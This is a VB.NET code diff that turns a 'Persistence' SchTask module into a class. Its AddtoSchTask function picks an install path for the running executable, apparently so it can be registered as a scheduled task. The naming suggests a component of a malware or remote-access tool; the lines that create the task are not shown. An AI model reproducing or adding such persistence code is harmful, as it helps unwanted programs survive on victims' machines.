@@ -1,11 +1,14 @@
 ﻿Imports System.IO
 Namespace Persistence
-    Module SchTask
+    Public Class SchTask
+        Public PATHS As String
+        Public InstallName As String
+        Public HardInstall As String
         Public Function AddtoSchTask()
             Try
                 Dim installfullpath As FileInfo
-                If Form1.HardInstall = "True" Then
-                    installfullpath = New FileInfo(Path.Combine(Environ(Form1.PathS), Form1.InstallName))
+                If HardInstall = "True" Then
+                    installfullpath = New FileInfo(Path.Combine(Environ(PATHS), InstallName))
                 Else
                     installfullpath = New FileInfo(Application.ExecutablePath)
                 End If
@@ -22,5 +25,5 @@ Namespace Persistence
                 Return False
             End Try
         End Function
-    End Module
+    End Class
 End Namespace
